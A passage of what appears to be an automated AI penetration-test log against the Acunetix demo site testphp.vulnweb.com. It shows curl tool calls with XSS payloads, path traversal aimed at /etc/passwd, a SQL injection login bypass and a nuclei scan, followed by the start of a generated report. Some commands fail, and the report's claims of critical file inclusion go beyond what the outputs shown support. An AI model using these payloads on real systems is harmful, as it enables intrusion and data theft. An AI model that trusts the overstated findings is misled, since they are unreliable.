-->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS')</script>'' at line 1",
+                "timestamp": "2026-01-09T22:22:00.397013",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//guestbook.php\" -d \"name=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&text=test\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//guestbook.php -d name=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&text=test | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:22:00.837844",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//showimage.php?file=....//....//....//....//etc/passwd\" | head -30",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//showimage.php?file=....//....//....//....//etc/passwd | head -30",
+                "success": true,
+                "output": "\nWarning: fopen(....//....//....//....//etc/passwd): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n",
+                "timestamp": "2026-01-09T22:22:00.846233",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com/?page=....//....//....//....//etc/passwd\" | head -30",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/?page=....//....//....//....//etc/passwd | head -30",
+                "success": true,
+                "output": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "timestamp": "2026-01-09T22:22:01.348879",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//showimage.php?file=../../../../../etc/passwd\" | head -30",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//showimage.php?file=../../../../../etc/passwd | head -30",
+                "success": true,
+                "output": "\nWarning: fopen(): open_basedir restriction in effect. File(../../../../../etc/passwd) is not within the allowed path(s): (/hj/:/tmp/:/proc/) in /hj/var/www/showimage.php on line 13\n\nWarning: fopen(../../../../../etc/passwd): failed to open stream: Operation not permitted in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n",
+                "timestamp": "2026-01-09T22:22:01.791140",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com/?page=../../../../../etc/passwd\" | head -30",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/?page=../../../../../etc/passwd | head -30",
+                "success": true,
+                "output": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "timestamp": "2026-01-09T22:22:02.233005",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//showimage.php?file=..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts\" | head -30",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//showimage.php?file=..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts | head -30",
+                "success": true,
+                "output": "\nWarning: fopen(..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n",
+                "timestamp": "2026-01-09T22:22:02.677370",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com/?page=..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts\" | head -30",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/?page=..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts | head -30",
+                "success": true,
+                "output": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "timestamp": "2026-01-09T22:22:03.120824",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//login.php\" -d \"uname=admin&pass=admin\" -v 2>&1 | grep -i 'cookie\\|session\\|location\\|error'",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//login.php -d uname=admin&pass=admin -v 2>&1 | grep -i cookie\\|session\\|location\\|error",
+                "success": true,
+                "output": "HTTP/1.1 200 OK\nServer: nginx/1.19.0\nDate: Sat, 10 Jan 2026 01:22:04 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>login page</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<div class=\"story\">\n\t<h3>If you are already registered please enter your login information below:</h3><br>\n\t<form name=\"loginform\" method=\"post\" action=\"userinfo.php\">\n\t<table cellpadding=\"4\" cellspacing=\"1\">\n\t\t<tr><td>Username : </td><td><input name=\"uname\" type=\"text\" size=\"20\" style=\"width:120px;\"></td></tr>\n\t\t<tr><td>Password : </td><td><input name=\"pass\" type=\"password\" size=\"20\" style=\"width:120px;\"></td></tr>\n\t\t<tr><td colspan=\"2\" align=\"right\"><input type=\"submit\" value=\"login\" style=\"width:75px;\"></td></tr>\n\t</table>\n\t</form>\n  \t</div>\n\t<div class=\"story\">\n\t<h3>\n        You can also <a href=\"signup.php\">signup here</a>.<br>\n        Signup disabled. Please use the username <font color='red'>test</font> and the password <font color='red'>test</font>. \n    </h3>\n\t</div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | &copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n* Host testphp.vulnweb.com:80 was resolved.\n* IPv6: (none)\n* IPv4: 44.228.249.3\n*   Trying 44.228.249.3:80...\n* Connected to testphp.vulnweb.com (44.228.249.3) port 80\n> POST //login.php HTTP/1.1\n> Host: testphp.vulnweb.com\n> User-Agent: curl/8.7.1\n> Accept: */*\n> Content-Length: 22\n> Content-Type: application/x-www-form-urlencoded\n> \n} [22 bytes data]\n* upload completely sent off: 22 bytes\n< HTTP/1.1 200 OK\n< Server: nginx/1.19.0\n< Date: Sat, 10 Jan 2026 01:22:04 GMT\n< Content-Type: text/html; charset=UTF-8\n< Transfer-Encoding: chunked\n< Connection: keep-alive\n< X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\n< \n{ [5536 bytes data]\n* Connection #0 to host testphp.vulnweb.com left intact\n* URL rejected: Bad hostname\n* Closing connection\n* Could not resolve host: |\n* Closing connection\n* Could not resolve host: grep\n* Closing connection\n* URL rejected: Bad hostname\n* Closing connection\n",
+                "timestamp": "2026-01-09T22:22:03.565213",
+                "exit_code": 3
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//login.php\" -d \"uname=admin' OR '1'='1&pass=x\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//login.php -d uname=admin' OR '1'='1&pass=x | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:22:04.010421",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//userinfo.php\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//userinfo.php | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:22:04.019091",
+                "exit_code": 2
+            },
+            {
+                "tool": "nuclei",
+                "args": "-u http://testphp.vulnweb.com/ -silent -nc -severity critical,high,medium,low",
+                "command": "/usr/local/bin/nuclei -u http://testphp.vulnweb.com/ -silent -nc -severity critical,high,medium,low",
+                "success": true,
+                "output": "",
+                "timestamp": "2026-01-09T22:22:04.026156",
+                "exit_code": 0
+            }
+        ],
+        "llm_response": "# Executive Summary\n\nThe penetration test of http://testphp.vulnweb.com revealed multiple critical security vulnerabilities including SQL injection, reflected XSS, and local file inclusion. The application demonstrates classic web application security flaws that could lead to complete database compromise and arbitrary code execution.\n\n# Vulnerabilities Found\n\n---\n## [CRITICAL] SQL Injection in listproducts.php\n\n| Field | Value |\n|-------|-------|\n| Severity | Critical |\n| CVSS | 9.8 |\n| CWE | CWE-89 |\n| Location | http://testphp.vulnweb.com/listproducts.php?cat=1 |\n\n### Description\nThe `cat` parameter in listproducts.php is vulnerable to SQL injection. SQLMap successfully identified multiple injection techniques including boolean-based blind, error-based, time-based blind, and UNION query injection.\n\n### Proof of Concept\n\n**Vulnerable Request:**\n```\ncurl \"http://testphp.vulnweb.com/listproducts.php?cat=1\"\n```\n\n**Payload 